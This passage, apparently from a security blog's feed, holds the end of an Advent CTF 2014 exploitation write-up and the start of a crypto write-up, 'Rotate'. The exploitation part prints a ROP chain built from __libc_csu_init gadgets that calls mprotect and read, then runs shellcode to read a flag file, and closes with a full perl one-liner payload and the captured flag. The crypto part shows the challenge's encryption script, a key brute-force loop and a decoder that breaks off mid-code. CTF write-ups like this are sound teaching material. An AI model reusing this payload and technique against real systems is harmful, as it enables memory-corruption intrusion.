</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00601038</span><span class="o">-</span><span class="mi">6</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># r12 -&gt; mprotect@got.plt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r13</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>            <span class="c"># r14 -&gt; rsi -&gt; esi = mprotect.len</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>   <span class="c"># r15 -&gt; rdi -&gt; edi = mprotect.addr</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400671</span><span class="p">)</span>   <span class="c">#mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">200</span><span class="o">-</span><span class="mi">144</span><span class="p">)</span>   <span class="c"># spacer</span>
</span><span class='line'>
</span><span class='line'><span class="c">#### READ</span>
</span><span class='line'><span class="c"># gadgets to set edi, esi and edx and call read</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">   0x00000000004005f2 &lt;+53&gt;:   mov    edx,0x400</span>
</span><span class='line'><span class="sd">   0x00000000004005f7 &lt;+58&gt;:   mov    rsi,rax</span>
</span><span class='line'><span class="sd">   0x00000000004005fa &lt;+61&gt;:   mov    edi,0x0</span>
</span><span class='line'><span class="sd">   0x00000000004005ff &lt;+66&gt;:   mov    eax,0x0</span>
</span><span class='line'><span class="sd">   0x0000000000400604 &lt;+71&gt;:   call   0x400490 &lt;read@plt&gt;</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="c"># 0x601020 &lt;read@got.plt&gt;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0040068a</span><span class="p">)</span>   <span class="c"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>       <span class="c"># rbx   &lt;&lt; needs to be ebp-1 for code path!</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>            <span class="c"># rbp -&gt; edx = 0x400</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="o">-</span><span class="mh">0x3ff</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>   <span class="c"># r12 -&gt; read@got.plt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r13 </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>   <span class="c"># r14 -&gt; rsi -&gt; esi = read.addr</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r15 -&gt; rdi -&gt; edi = 0?</span>
</span><span class='line'>                          <span class="c"># lucky for me, rax = 0</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400671</span><span class="p">)</span>   <span class="c">#mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">200</span><span class="o">-</span><span class="mi">144</span><span class="p">)</span>   <span class="c"># spacer</span>
</span><span class='line'>
</span><span class='line'><span class="c"># return to shellcode!</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>   <span class="mh">0x400671</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">ebp</span>
</span><span class='line'>   <span class="mh">0x400673</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">r14</span>
</span><span class='line'>   <span class="mh">0x400676</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">r15d</span>
</span><span class='line'>   <span class="mh">0x400679</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">call</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r12</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x40067d</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">add</span>    <span class="n">rbx</span><span class="p">,</span><span class="mh">0x1</span>
</span><span class='line'>   <span class="mh">0x400681</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nb">cmp</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">rbp</span> 
</span><span class='line'>   <span class="mh">0x400684</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">jne</span>    <span class="mh">0x400670</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x400686</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">86</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x8</span>
</span><span class='line'>   <span class="mh">0x40068a</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">rbx</span>
</span><span class='line'>   <span class="mh">0x40068b</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">rbp</span>
</span><span class='line'>   <span class="mh">0x40068c</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r12</span>
</span><span class='line'>   <span class="mh">0x40068e</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">94</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r13</span>
</span><span class='line'>   <span class="mh">0x400690</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r14</span>
</span><span class='line'>   <span class="mh">0x400692</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">98</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r15</span>
</span><span class='line'>   <span class="mh">0x400694</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>

<p>The problem arises after returning from the mprotect call:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x40067d &lt;__libc_csu_init+77&gt;:  add    rbx,0x1
</span><span class='line'>   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
</span><span class='line'>   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
</span></code></pre></td></tr></table></div></figure>


<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>

<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>

<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>  <span class="n">output</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x&quot;</span> <span class="o">+</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">:</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">output</span>
</span></code></pre></td></tr></table></div></figure>


<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">xor</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="mh">0x41</span>
</span><span class='line'><span class="o">--&gt;</span>
</span><span class='line'><span class="n">xor</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="mh">0x41</span>
</span></code></pre></td></tr></table></div></figure>


<p>And <strong>finally</strong>, starting from the first binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python exploit.py
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span>
</span><span class='line'><span class="o">(</span>perl -e <span class="s1">&#39;print &quot;\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00&quot;&#39;</span><span class="p">;</span> perl -e <span class="s1">&#39;print &quot;\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41&quot;&#39;</span><span class="o">)</span> <span class="p">|</span> ./shellcodeme2
</span><span class='line'>ADCTF_I_l0v3_tH15_4W350M3_m15T4K
</span></code></pre></td></tr></table></div></figure>


<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Rotate]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-2014-rotate/"/>
    <updated>2014-12-21T16:09:36+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/21/advent-ctf-2014-rotate</id>
    <content type="html"><![CDATA[<p>A crypto challenge! We&rsquo;re given a zip-file, containing <code>flag.jpg.enc</code> and <code>rotate.py</code>.</p>

<!-- more -->


<p><code>rotate.py</code> handles the encryption, but only does so one way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">math</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;f&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'><span class="n">u</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
</span><span class='line'>
</span><span class='line'><span class="n">bs</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'><span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span> <span class="o">+</span> <span class="s">&#39;.enc&#39;</span><span class="p">,</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">bs</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
</span><span class='line'>    <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">u</span><span class="p">(</span><span class="n">bs</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">u</span><span class="p">(</span><span class="n">bs</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>    <span class="n">enc</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">-</span> <span class="n">y</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">key</span><span class="p">))</span> <span class="o">+</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="n">y</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">key</span><span class="p">)))</span>
</span></code></pre></td></tr></table></div></figure>


<p>The script takes two bytes at a time and transforms them into two floats via some goniometric functions, using a key. These floats are then dumped as DWORDS into the encrypted output file. Our first job is to determine what key was used.</p>

<p>Assuming the flag really <strong>is</strong> a JPEG, we have some prior knowledge. Namely, the first two bytes are <code>0xff,0xd8</code>. I made a small file that contains only these two bytes and I ripped the first 8 bytes from <code>flag.jpg.enc</code>. I encoded the small 2-byte file with all possible keys and then compared the md5sum of each file to the md5sum of the 8-byte encoded file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf/rotate<span class="nv">$ </span><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">0</span> 360<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> python rotate.py ./header_real2 <span class="nv">$i</span><span class="p">;</span> mv header_real2.enc output<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'>bas@tritonal:~/adventctf/rotate<span class="nv">$ </span>md5sum header_encoded8
</span><span class='line'>ed3f26885ebe2ba3ec0aa61215e4dcf2  header_encoded8
</span><span class='line'>bas@tritonal:~/adventctf/rotate<span class="nv">$ </span>md5sum output* <span class="p">|</span>grep ed3f2
</span><span class='line'>ed3f26885ebe2ba3ec0aa61215e4dcf2  output123
</span></code></pre></td></tr></table></div></figure>


<p>So I now know the key that was used was <code>123</code>. I then started building a decoder. I hit a few snags on the way. It turns out that <code>rotate.py</code> doesn&rsquo;t use the literal value of each byte, but instead uses <code>struct.unpack('b', byte)</code> to generate a <strong>signed</strong> representation. That threw me off for a good while.</p>

<p>The decoder first builds a lookup table of each possible two-byte combination. Then, to decode, it reads eight bytes at a time and looks up the corresponding values from the lookup table. If there are no more floats to be read, it catches the error and outputs the decrypted data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">math</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;f&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'><span class="n">u</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
</span><span class='line'>
</span><span class='line'><span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#39;rb&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">lookup</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      <span class="n">y</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">l</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">x1</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">-</span> <span class="n">y</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
</span><span class='line'>      <span class="n">x2</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="n">y</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">x3</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      <span class="n">x4</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x2</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">lookup</span><span class="p">[</span> <span class="p">(</span><span class="n">x3</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">x4</span> <span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="n">going</span> <span class="o">=</span> <span class="mi">1</span>
